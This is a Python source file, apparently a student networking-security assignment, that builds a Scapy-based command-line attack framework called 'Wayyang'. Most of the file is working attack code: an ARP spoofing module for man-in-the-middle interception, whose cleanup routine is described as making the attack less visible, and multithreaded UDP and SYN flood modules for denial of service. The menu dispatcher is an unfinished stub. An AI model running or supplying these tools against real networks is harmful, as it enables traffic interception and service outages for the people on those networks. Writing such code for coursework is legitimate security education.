# /usr/bin/python3

'''
ICT2203 Networking Security: Assignment 1

2003109 Jared Marc Song Kye-Jet
2003XXX Low Weiyang
2003XXX Amos Ng Zheng Jie
2003XXX Kuo Eugene

todo:
- add more exploits
- add method to call exploits similar to msfconsole
'''

from scapy.all import *
from time import sleep
import sys
import logging
import threading
import argparse

logging.basicConfig(level=logging.INFO)

MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"
IPV4_BROADCAST = "255.255.255.255"

class Exploit(object):
	'''
	Every exploit follows standard structure
	- an init() method to setup the exploit
	- an exploit() method to actually run the exploit
	- a restore() method to undo the exploit, if persistent changes are made to the network
	'''
	def __init__(self):
		'''
		Calls the utility methods to setup variables that subclass exploits will use
		'''
		self.get_own_mac()
		self.get_own_ip()
		self.get_router_ip()

		'''
		We perform some simple error checking - 
			PermissionError - lacks superuser permissions or cannot acquire socket
			AssertionError - something very wrong and idk what
		'''
		try:
			assert self.own_mac == self.mac_from_ip(self.own_ip)
		except PermissionError:
			logging.error(f"Insufficient permissions, run with sudo ./{sys.argv[0]}")
			sys.exit(0)
		except AssertionError:
			logging.error(f"Total network failure...")
			sys.exit(0)

		self.params = dict()

	def exploit(self):
		pass

	def restore(self):
		pass

	def show_params(self):
		for param, value in self.params.items():
			logging.info(f"{param} => {value}")

	def about(self) -> str:
		'''
		Some information about module. Will never be used, just an example
		'''
		return "exploit - Basic exploit base class"

	'''
	We also implement some utility methods that exploits can use.
	'''
	def get_own_mac(self):
		'''
		Resolves own MAC address
		'''
		self.own_mac = Ether().src

	def get_own_ip(self):
		'''
		Resolves own IP address
		'''
		self.own_ip = IP().src

	def get_router_ip(self):
		'''
		Resolves router IP address
		'''
		self.router_ip = conf.route.route("0.0.0.0")[2]

	def mac_from_ip(self, ip: str) -> str:
		'''
		Utility method for layer 2 exploits: resolves an IP to a MAC using ARP.
		'''
		arp_broadcast = Ether(dst=MAC_BROADCAST)/ARP(op=1, pdst=ip)
		recv_packets = srp(arp_broadcast, timeout=2, verbose=0)
		try:
			return recv_packets[0][0][1].hwsrc
		except IndexError: # no packets returned, network not up or IP does not exist
			logging.error(f"MAC address corresponding to {ip} not found!")
			logging.info("Substituting broadcast MAC address...")
			return MAC_BROADCAST

class ARPSpoof(Exploit):
	'''
	This exploit implements a basic ARP spoofing attack - by overwriting the ARP tables of the gateway and target, all packets travelling between the two will be routed through our host.
	As the ARP tables of the target host and gateway will be overwritten, the restore method is necessary.

	'''
	def __init__(self, gateway_ip: str, target_ip: str, verbosity: int = 0, delay: float = 0.2):
		super().__init__()

		self.verbosity = verbosity
		self.gateway_ip = gateway_ip
		self.target_ip = target_ip
		self.delay = delay

		self.gateway_mac = self.mac_from_ip(gateway_ip)
		self.target_mac = self.mac_from_ip(target_ip)

		self.params = {
			"verbosity": self.verbosity,
			"gateway_ip": self.gateway_ip,
			"gateway_mac": self.gateway_mac,
			"target_ip": self.target_ip,
			"target_mac": self.target_mac,
			"delay": self.delay
		}

		self.run = True # boolean to handle exploit loop 

	def exploit(self):
		'''
		As ARP tables have a decay timing, to perpetutate this attack packets need to be constantly sent.
		'''
		logging.info(f"Beginning ARP spoofing attack on {self.target_ip}")

		target_arp_pkt = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.own_mac)
		gateway_arp_pkt = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)

		while self.run:
			try:
				send(target_arp_pkt, verbose=0)
				sleep(self.delay)
				send(gateway_arp_pkt, verbose=0)
				sleep(self.delay)
			except KeyboardInterrupt:
				logging.info("Ending ARP spoofing exploit...")
				self.run = False
				self.restore()

	def restore(self):
		'''
		Even though the MAC tables will eventually restore themselves, we call this method to make our attack less visible.
		'''
		logging.info(f"Restoring original ARP tables...")

		target_arp_pkt = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.gateway_mac)
		gateway_arp_pkt = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.target_mac)

		for repeat in range(5): # randomly chosen constant as of now
			send(target_arp_pkt)
			sleep(self.delay)
			send(gateway_arp_pkt)
			sleep(self.delay)

		logging.info("ARP table restore complete!")

class UDPFlood(Exploit):
	'''
	All DDoS attacks do not support a restore method.
	We implement threaded DDoS attacks to increase packet throughput.
	Sends a flood of UDP packets.
	'''
	def __init__(self, target_ip: str, threads: int = 1, verbosity: int = 0):
		super().__init__()
		self.target_ip = target_ip
		self.num_threads = threads
		self.verbosity = verbosity

		self.threads = []

		self.params = {
			"target_ip": self.target_ip,
			"num_threads": self.num_threads,
			"verbosity": self.verbosity
		}

	def exploit(self):
		'''
		Multithreaded UDP flood implementation
		'''
		for thread in range(self.num_threads):
			new_thread = threading.Thread(target=self.exploit_thread, args=(thread,))
			self.threads.append(new_thread)
		try:
			[t.start() for t in self.threads]
		except KeyboardInterrupt:
			logging.info(f"Exiting UDP flood attack!")
			[t.join() for t in self.threads]

	def exploit_thread(self, thread_id: int):
		'''
		Function called by thread to send DDOS packets
		'''
		logging.info(f"Thread {thread_id} starting!")
		flood_pkt = IP(dst=self.target_ip)/fuzz(UDP())
		send(flood_pkt, loop=1, verbose=0)

class SYNFlood(Exploit):
	'''
	Yet another DDoS attack, but this one sends SYN packets
	'''
	def __init__(self, target_ip: str = "127.0.0.1", target_port: int = 80, threads: int = 1, verbosity: int = 0):
		super().__init__()
		self.target_ip = target_ip
		self.target_port = target_port
		self.num_threads = threads
		self.verbosity = verbosity

		self.threads = []

		self.params = {
			"target_ip": self.target_ip,
			"target_port": self.target_port,
			"num_threads": self.num_threads
		}

		self.show_params()

	def exploit(self):
		'''
		Multithreaded SYN flood implementation
		'''
		for thread in range(self.num_threads):
			new_thread = threading.Thread(target=self.exploit_thread, args=(thread,))
			self.threads.append(new_thread)
		try:
			[t.start() for t in self.threads]
		except KeyboardInterrupt:
			logging.info(f"Exiting UDP flood attack!")
			[t.join() for t in self.threads]

	def exploit_thread(self, thread_id: int):
		'''
		Function called by thread to send DDOS packets
		'''
		logging.info(f"Thread {thread_id} starting!")
		flood_pkt = IP(dst=self.target_ip)/TCP(flags="S", sport=RandShort(), dport=80)
		send(flood_pkt, loop=1, verbose=0)

class WayyangPrompt(object):
	'''
	Object to handle Wayyang prompt.
	Allows selection of user commands, modules, execution, etc using a simple syntax
	'''
	def __init__(self):
		'''
		Setup prompt environment, load exploits
		'''
		self.prompt_list = ["wayyang"]
		self.exploits = {
							("0", "arpspoof"): ARPSpoof,
							("1", "udpflood"): UDPFlood,
							("2", "synflood"): SYNFlood
						}
		self.current_exploit = None

		self.abouts = [
			"arpspoof: ARP spoofer to perform man-in-the-middle attacks",
			"udpflood: multithreaded UDP flooding",
			"synflood: multithreaded SYN flooding"

		]

		self.loop = True

		while self.loop:
			try:
				command_ls = self.parse_commands(input(self.generate_prompt_string()))
			except KeyboardInterrupt:
				self.loop = False

	def generate_prompt_string(self) -> str:
		return f"{''.join(self.prompt_list)} > "

	def parse_commands(self, commands):
		'''
		Commands we can use:
			exit - exits the application
			use EXPLOIT_NAME - selects an exploit for use

		'''
		command_list = commands.split()
		if len(command_list) == 1:
			verb = command_list[0]
			if verb == "exit":
				print("Exiting Wayyang.py.")
				self.loop = False
				return True
			elif verb == "help":
				print("Help: ")
				print("\t show / list")
				print("\t\t exploits - lists all exploits available for use")
				print("\t use / select")
				print("\t\t EXPLOIT_NAME / EXPLOIT_ID - select an exploit for use")
				print("\t exit - exits the application")
				print("\t help - shows this help menu")
				return True
		elif len(command_list) == 2:
			verb, param = command_list
			if verb == "show" or verb == "list":
				if param == "exploits":
					print("ID:\t Exploit")
					for idx, exploit_info in enumerate(self.abouts):
						print(f"{idx}:\t {exploit_info}")
					return True
			elif verb == "use" or verb == "select":
				for identifier, exploit in self.exploits.items():
					if param in identifier:
						self.prompt_list.append(f"({identifier[1]})")
						self.parse_module_commands(int(identifier[0]))
						# print("exiting higher level cmd parser")
						return True
				print("Module not found!")
				return False

	def parse_module_commands(self, module_id: int):
		# exp = list(self.exploits.values())[module_id]()
		pass

	


if __name__ == '__main__':
	print("Wayyang.py beta version")
	p = WayyangPrompt()
